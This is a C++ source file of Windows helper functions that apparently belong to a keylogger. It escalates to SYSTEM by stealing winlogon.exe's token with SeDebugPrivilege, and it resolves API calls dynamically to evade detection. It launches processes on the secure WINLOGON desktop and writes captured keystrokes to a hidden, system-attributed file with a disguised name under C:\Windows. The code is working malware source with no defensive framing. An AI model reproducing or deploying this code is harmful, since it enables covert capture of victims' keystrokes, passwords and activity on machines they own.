#include "functions.h"
#include <cwctype>
#include <algorithm>
#include <sddl.h>
#include <tlhelp32.h>

bool isRunningAsSystem()
{
    HMODULE hAdvapi32 = MyLoadLibraryA("Advapi32.dll");
    if (!hAdvapi32) return false;

    pOpenProcessToken MyOpenProcessToken = (pOpenProcessToken)MyGetProcAddress(hAdvapi32, "OpenProcessToken");
    pGetTokenInformation MyGetTokenInformation = (pGetTokenInformation)MyGetProcAddress(hAdvapi32, "GetTokenInformation");
    pConvertSidToStringSidW MyConvertSidToStringSidW = (pConvertSidToStringSidW)MyGetProcAddress(hAdvapi32, "ConvertSidToStringSidW");

    HANDLE hToken = NULL;
    if (!MyOpenProcessToken || !MyOpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
    {
        FreeLibrary(hAdvapi32);
        return false;
    }

    BYTE buf[512]{};
    DWORD sz = 0;
    if (!MyGetTokenInformation || !MyGetTokenInformation(hToken, TokenUser, buf, sizeof(buf), &sz))
    {
        CloseHandle(hToken);
        FreeLibrary(hAdvapi32);
        return false;
    }
    CloseHandle(hToken);

    PTOKEN_USER ptu = (PTOKEN_USER)buf;
    LPWSTR sidStr = NULL;

    bool result = false;
    if (MyConvertSidToStringSidW)
    {
        MyConvertSidToStringSidW(ptu->User.Sid, &sidStr);
        result = (wcscmp(sidStr, L"S-1-5-18") == 0);
        LocalFree(sidStr);
    }

    FreeLibrary(hAdvapi32);
    return result;
}

bool EnablePrivileges(LPCWSTR priv)
{
    HMODULE hAdvapi32 = MyLoadLibraryA("Advapi32.dll");
    if (!hAdvapi32) return false;

    pOpenProcessToken MyOpenProcessToken = (pOpenProcessToken)MyGetProcAddress(hAdvapi32, "OpenProcessToken");
    pLookupPrivilegeValueW MyLookupPrivilegeValueW = (pLookupPrivilegeValueW)MyGetProcAddress(hAdvapi32, "LookupPrivilegeValueW");
    pAdjustTokenPrivileges MyAdjustTokenPrivileges = (pAdjustTokenPrivileges)MyGetProcAddress(hAdvapi32, "AdjustTokenPrivileges");

    HANDLE hToken = NULL;
    if (!MyOpenProcessToken || !MyOpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
    {
        FreeLibrary(hAdvapi32);
        return false;
    }

    TOKEN_PRIVILEGES tp = { 1 };
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!MyLookupPrivilegeValueW || !MyLookupPrivilegeValueW(NULL, priv, &tp.Privileges[0].Luid))
    {
        CloseHandle(hToken);
        FreeLibrary(hAdvapi32);
        return false;
    }

    bool result = false;
    if (MyAdjustTokenPrivileges)
    {
        result = MyAdjustTokenPrivileges(hToken, FALSE, &tp,
            sizeof(tp), NULL, NULL);
        result = result && GetLastError() == ERROR_SUCCESS;
    }

    CloseHandle(hToken);
    FreeLibrary(hAdvapi32);

    return result;
}

bool RelaunchAsSystem(const std::wstring cmdLine)
{

    DWORD winlogonPID = 0;
    PROCESSENTRY32 pe = { sizeof(PROCESSENTRY32) };
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return false;

    if (Process32First(hSnapshot, &pe))
    {
        do
        {
            if (_wcsicmp(pe.szExeFile, L"winlogon.exe") == 0)
            {
                CloseHandle(hSnapshot);
                winlogonPID = pe.th32ProcessID;
            }

        } while (Process32Next(hSnapshot, &pe));
    }
    CloseHandle(hSnapshot);
    if (!winlogonPID) return false;

    if (!EnablePrivileges(SE_DEBUG_NAME)) return false;

    HMODULE hAdvapi32 = MyLoadLibraryA("Advapi32.dll");
    if (!hAdvapi32) return false;

    pOpenProcessToken MyOpenProcessToken = (pOpenProcessToken)MyGetProcAddress(hAdvapi32, "OpenProcessToken");
    pDuplicateTokenEx MyDuplicateTokenEx = (pDuplicateTokenEx)MyGetProcAddress(hAdvapi32, "DuplicateTokenEx");
    pCreateProcessWithTokenW MyCreateProcessWithTokenW = (pCreateProcessWithTokenW)MyGetProcAddress(hAdvapi32, "CreateProcessWithTokenW");

    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, winlogonPID);
    if (!hProc)
    {
        FreeLibrary(hAdvapi32);
        return false;
    }

    HANDLE hTok = NULL;
    if (!MyOpenProcessToken || !MyOpenProcessToken(hProc, TOKEN_DUPLICATE, &hTok))
    {
        CloseHandle(hProc);
        FreeLibrary(hAdvapi32);
        return false;
    }

    SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, FALSE };
    HANDLE hNewTok = NULL;
    if (!MyDuplicateTokenEx || !MyDuplicateTokenEx(hTok, TOKEN_ALL_ACCESS, &sa, SecurityImpersonation, TokenPrimary, &hNewTok))
    {
        CloseHandle(hProc);
        CloseHandle(hTok);
        FreeLibrary(hAdvapi32);
        return false;
    }

    STARTUPINFOW si = { sizeof(si) };
    si.lpDesktop = (LPWSTR)L"winsta0\\default";
    PROCESS_INFORMATION pi = {};

    bool created = false;
    if (MyCreateProcessWithTokenW)
    {
        created = MyCreateProcessWithTokenW(hNewTok, 0, NULL,
            (LPWSTR)cmdLine.c_str(), 0,
            NULL, NULL, &si, &pi);
    }

    CloseHandle(hProc);
    CloseHandle(hTok);
    CloseHandle(hNewTok);

    if (!created)
    {
        FreeLibrary(hAdvapi32);
        return false;
    }

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    FreeLibrary(hAdvapi32);

    return true;

}

bool RelaunchWithWINLOGONDesktop(const std::wstring cmdLine)
{
    STARTUPINFOW si = { sizeof(STARTUPINFOW) };
    si.lpDesktop = (LPWSTR)L"WINSTA0\\WINLOGON";
    PROCESS_INFORMATION pi = {};

    if (!CreateProcess(NULL, (LPWSTR)cmdLine.c_str(), NULL, NULL,
        FALSE, 0, NULL, NULL, &si, &pi))
        return false;

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    return true;
}

std::wstring GetCurrentDesktopName()
{
    HDESK hDesk = GetThreadDesktop(GetCurrentThreadId());
    if (!hDesk) return L"Unknow";

    DWORD needed = 0;
    GetUserObjectInformation(hDesk, UOI_NAME, NULL, 0, &needed);
    if (needed == 0) return L"Noname";

    std::wstring name;
    name.resize(needed / sizeof(wchar_t));

    if (GetUserObjectInformation(hDesk, UOI_NAME, (LPVOID)name.data(), needed, &needed))
    {
        name.resize(wcsnlen(name.data(), name.size()));
        return name;
    }

    return L"Error";
}

std::wstring StringToWString(const std::string& str) {
    int size_needed = MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, NULL, 0);
    std::wstring wstr(size_needed, 0);
    MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, &wstr[0], size_needed);
    wstr.resize(wstr.size() - 1);
    return wstr;
}

std::wstring ToLower(std::wstring str) {
    std::transform(str.begin(), str.end(), str.begin(),
        [](wchar_t c) {
            return static_cast<wchar_t>(std::towlower(static_cast<wint_t>(c)));
        });
    return str;
}

std::wstring GetCurrentTimeAsString() {
    SYSTEMTIME st{};
    GetLocalTime(&st);

    wchar_t dateBuf[11];
    wchar_t timeBuf[9];

    int dateLen = GetDateFormatW(LOCALE_USER_DEFAULT, DATE_SHORTDATE, &st, L"yyyy-MM-dd", dateBuf, _countof(dateBuf));
    if (dateLen == 0)
        return {};

    int timeLen = GetTimeFormatW(LOCALE_USER_DEFAULT, TIME_FORCE24HOURFORMAT, &st, nullptr, timeBuf, _countof(timeBuf));
    if (timeLen == 0)
        return {};

    std::wstring result = std::wstring(dateBuf) + L" " + std::wstring(timeBuf, timeLen - 1);  // -1 для \0
    return result;
}

bool CreateDirectoryRecursive(const std::wstring& path)
{
    size_t pos = 0;
    std::wstring sub;
    do
    {
        pos = path.find_first_of(L"\\/", pos + 1);
        sub = path.substr(0, pos);
        if (sub.empty()) continue;
        CreateDirectory(sub.c_str(), NULL);
    } while (pos != std::wstring::npos);
    return true;
}

bool WriteKeyLogToLogFileSystemHidden(const std::wstring& data)
{
    HANDLE hFile = CreateFileW(LR"(C:\Windows\IdentityCRL\production\windaft64.win)",
        FILE_APPEND_DATA, FILE_SHARE_READ, NULL,
        OPEN_ALWAYS, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM,
        NULL);

    if (hFile == INVALID_HANDLE_VALUE) return false;

    DWORD written = 0;
    WriteFile(hFile, data.c_str(), data.length() * sizeof(data[0]), &written, NULL);
    CloseHandle(hFile);

    return true;
}

std::wstring GetCurrentWindow()
{
    HWND hwnd = GetForegroundWindow();
    if (!hwnd)
        return {};

    DWORD pid = 0;
    GetWindowThreadProcessId(hwnd, &pid);

    HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_READ,
        false, pid);
    if (!hProcess)
        return {};

    WCHAR filename[MAX_PATH];
    DWORD size = MAX_PATH;
    if (QueryFullProcessImageNameW(hProcess, 0, filename, &size))
    {
        CloseHandle(hProcess);
        return filename;
    }

    CloseHandle(hProcess);
}